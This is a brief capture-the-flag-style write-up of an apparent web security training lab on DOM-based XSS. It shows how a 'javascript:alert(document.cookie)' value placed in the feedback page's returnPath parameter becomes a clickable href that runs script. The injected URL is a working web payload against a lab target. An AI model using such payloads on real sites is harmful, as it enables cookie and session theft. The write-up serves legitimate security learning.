# Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

*5/19/2026*

**Base URL:**
https://0a0500670386d205802821970042006f.web-security-academy.net/ 

**Vulnerable URL:**
https://0a0500670386d205802821970042006f.web-security-academy.net/feedback?returnPath=/ 

**Injected URL:**
https://0a0500670386d205802821970042006f.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie) 

**Note:**
``javascript:alert(document.cookie)``

The function above can be applied to the returnPath on the feedback page because of a vulnerability in href. This vulnerability is often overlooked by developers because it is pretty unique, but by tagging ``javascript:`` into a button’s attribute that is contained in the href, the code after the `:` will be executed upon clicking the button on the web page.

